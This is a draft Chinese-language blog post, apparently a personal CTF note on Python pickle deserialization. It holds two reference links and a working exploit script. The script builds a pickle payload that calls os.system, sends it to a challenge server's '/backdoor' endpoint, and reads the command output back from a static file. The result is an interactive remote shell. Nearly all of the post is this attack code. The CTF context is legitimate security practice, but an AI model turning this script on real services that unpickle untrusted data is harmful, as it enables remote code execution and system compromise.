---
title: pickle反序列化
author: Creexile
date: 2025-05-06 09:51:59
categories:
description:
lastMod: 2025-05-06
summary: ''
cover: ''
category: CTF
draft: true
comments: true
sticky: 0
tags:
  - 反序列化
  - Python
---

# pickle反序列化

[知乎-从零开始python反序列化攻击：pickle原理解析 & 不用reduce的RCE姿势](https://zhuanlan.zhihu.com/p/89132768)

[个人网站-Python pickle反序列化浅析](https://www.ctfiot.com/64787.html)

有大佬搞出来一个虚拟终端, 先整个框镶起来

```python
import requests, base64, time

def round(command: str, arg: str):
    url = "http://39995c7b-513e-4c09-9e77-01499da948bc.challenge.ctf.show/"  # 以/结尾
    payload = f'''cos\n{command}\n(S'{arg}'\ntR.'''.encode()
    params = {"r": "test/ss", "data": base64.b64encode(payload).decode()}
    while True:
        try:
            resp = requests.get(url+"backdoor", params=params)
            break
        except:
            time.sleep(0.1)

    while True:
        try:
            resp = requests.get(url+"static/1")
            break
        except:
            time.sleep(0.1)

    return resp.text


if __name__ == '__main__':
    print("请输入命令...")
    while True:
        command = "system"
        arg = input(">>> ")
        if arg == "exit":
            break
        if arg == "":
            continue
        arg = f'mkdir -p /app/static && {arg} > /app/static/1'
        res = round(command, arg + "")
        print(res[:-1])
```
